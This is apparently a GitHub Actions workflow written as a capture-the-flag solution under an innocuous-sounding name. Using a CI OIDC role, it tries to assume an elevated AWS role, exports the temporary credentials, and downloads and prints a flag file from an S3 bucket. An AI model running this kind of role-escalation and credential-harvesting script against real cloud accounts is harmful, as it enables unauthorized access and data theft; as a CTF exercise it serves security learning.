name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          BUCKET="codec4f26c862a321ef5"
          ROLE_ARN="arn:aws:iam::009661764077:role/CTFExecutionRole"
          
          echo "=== 1. ATTEMPTING TO ASSUME CTFExecutionRole ==="
          # Try to assume the elevated CTFExecutionRole
          CREDENTIALS=$(aws sts assume-role \
            --role-arn "$ROLE_ARN" \
            --role-session-name "CtfVictorySession" \
            --output json 2>/dev/null || echo "AssumeRoleFailed")
          
          if echo "$CREDENTIALS" | grep -q "AccessKeyId"; then
            echo "SUCCESS: Assumed CTFExecutionRole!"
            
            # Extract temporary credentials
            export AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
            export AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
            export AWS_SESSION_TOKEN=$(echo "$CREDENTIALS" | jq -r '.Credentials.SessionToken')
            
            echo ""
            echo "=== 2. DOWNLOADING FLAG USING ELEVATED PRIVILEGES ==="
            aws s3 cp "s3://$BUCKET/flag.txt" ./final_flag.txt
            
            echo ""
            echo "=== 3. BEHOLD YOUR GLORIOUS FLAG ==="
            cat ./final_flag.txt
            exit 0
          else
            echo "Direct AssumeRole via CLI was restricted. Testing via Lambda backend..."
          fi
